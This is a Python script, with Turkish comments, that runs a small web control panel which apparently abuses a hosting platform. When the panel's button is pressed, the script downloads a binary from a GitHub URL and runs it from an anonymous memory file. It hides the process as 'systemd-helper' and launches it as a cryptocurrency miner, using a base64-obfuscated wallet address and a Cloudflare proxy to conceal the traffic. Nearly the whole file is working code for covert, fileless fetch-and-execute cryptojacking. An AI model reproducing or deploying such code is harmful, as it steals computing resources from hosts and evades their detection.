#!/usr/bin/env python3
import os
import time
import base64
import threading
import subprocess
import ctypes
import http.server
import urllib.request
import json
from urllib.parse import urlparse
from collections import deque

libc = ctypes.CDLL('libc.so.6')
# Canlı logları tutmak için kuyruk
CONSOLE_LOGS = deque(maxlen=50)
STATUS = {"running": False, "message": "Sistem Beklemede"}
CF_WORKER_HOST = ""
WALLET_ADDR = base64.b64decode("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=").decode()

def log_to_console(msg):
    timestamp = time.strftime("%H:%M:%S")
    line = f"[{timestamp}] {msg}"
    CONSOLE_LOGS.append(line)
    print(line)

def set_process_name(name):
    try: libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
    except: pass

def execution_logic():
    global STATUS
    try:
        log_to_console("Aktivasyon sinyali alındı.")
        log_to_console("Çekirdek indiriliyor: GitHub/Exma0/va/x")
        
        url = "https://github.com/Exma0/va/raw/refs/heads/main/x"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            binary_content = response.read()
        
        log_to_console(f"İndirme başarılı. Boyut: {len(binary_content)} bayt.")
        log_to_console("RAM disk alanı (memfd) oluşturuluyor...")
        
        # memfd_create: syscall 319, flags = 0 (MFD_CLOEXEC yok, child sürece geçer)
        fd = libc.syscall(319, b"sys-kernel-core", 0)
        os.write(fd, binary_content)
        os.fchmod(fd, 0o755)  # Çalıştırma izni ver
        mem_path = f"/proc/self/fd/{fd}"
        
        log_to_console("Süreç maskeleniyor: systemd-helper")
        set_process_name("systemd-helper")
        
        cmd = [
            mem_path, "-o", f"{CF_WORKER_HOST}:443", "-u", WALLET_ADDR,
            "-p", f"node-{int(time.time())%1000}", "--keepalive", "--tls",
            "--donate-level=1", "--cpu-max-threads-hint", "50"
        ]

        STATUS["running"] = True
        STATUS["message"] = "Sistem Aktif"
        log_to_console("Madenci başlatıldı. Trafik Cloudflare üzerinden akıyor.")

        # Alt süreci başlat ve çıktılarını oku
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
                                text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"})
        
        for line in iter(proc.stdout.readline, ""):
            if line:
                log_to_console(f"[CORE] {line.strip()}")
                
    except Exception as e:
        STATUS["running"] = False
        STATUS["message"] = "Kritik Hata"
        log_to_console(f"HATA: {str(e)}")

class ControlHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/api/logs":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(list(CONSOLE_LOGS)).encode())
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        
        btn_state = 'disabled style="opacity:0.5"' if STATUS["running"] else ""
        
        html = f"""
        <html><head><title>Kernel Console</title><style>
            body {{ background: #000; color: #0f0; font-family: 'Consolas', monospace; padding: 20px; }}
            .panel {{ border: 1px solid #222; padding: 20px; max-width: 900px; margin: auto; background: #050505; }}
            #console {{ background: #000; border: 1px solid #111; height: 300px; overflow-y: auto; padding: 10px; font-size: 12px; color: #888; margin-top: 20px; }}
            .btn {{ background: transparent; border: 1px solid #0f0; color: #0f0; padding: 10px 20px; cursor: pointer; }}
            .btn:hover:not(:disabled) {{ background: #0f0; color: #000; }}
            .stat {{ color: {"#0f0" if STATUS["running"] else "#f00"}; font-weight: bold; }}
        </style></head><body>
            <div class="panel">
                <h2>KERNEL CONTROL UNIT</h2>
                <p>DURUM: <span class="stat">{STATUS['message']}</span></p>
                <form action="/run" method="post"><button class="btn" {btn_state}>SİSTEMİ BAŞLAT</button></form>
                <div id="console">Konsol bekleniyor...</div>
            </div>
            <script>
                async function updateLogs() {{
                    try {{
                        const r = await fetch('/api/logs');
                        const logs = await r.json();
                        const c = document.getElementById('console');
                        c.innerHTML = logs.join('<br>');
                        c.scrollTop = c.scrollHeight;
                    }} catch(e) {{}}
                }}
                setInterval(updateLogs, 2000);
                updateLogs();
            </script>
        </body></html>
        """
        self.wfile.write(html.encode())

    def do_POST(self):
        if self.path == "/run" and not STATUS["running"]:
            threading.Thread(target=execution_logic, daemon=True).start()
        self.send_response(303)
        self.send_header("Location", "/")
        self.end_headers()

def run():
    raw_url = os.environ.get("PROXY_URL", "")
    parsed = urlparse(raw_url)
    global CF_WORKER_HOST
    CF_WORKER_HOST = parsed.netloc if parsed.netloc else raw_url.split('/')[0]
    port = int(os.environ.get("PORT", 8080))
    http.server.ThreadingHTTPServer(("0.0.0.0", port), ControlHandler).serve_forever()

if __name__ == "__main__":
    run()
